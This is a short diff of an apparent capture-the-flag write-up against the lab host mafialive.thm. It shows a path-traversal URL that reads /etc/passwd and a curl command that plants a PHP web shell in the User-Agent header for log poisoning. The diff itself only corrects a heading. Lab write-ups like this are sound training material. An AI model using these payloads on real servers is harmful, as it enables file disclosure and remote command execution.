@@ -21,7 +21,7 @@ fuzz other endpoint than `view`
 payload worked : http://mafialive.thm/test.php?view=/var/www/html/development_testing/..///////..///////..///////..///////etc/passwd
 
 
-get shell by posing
+get shell by log poising.
 
 `curl http://mafialive.thm -A "<?php system(\$_GET['cmd']);?>"`
 
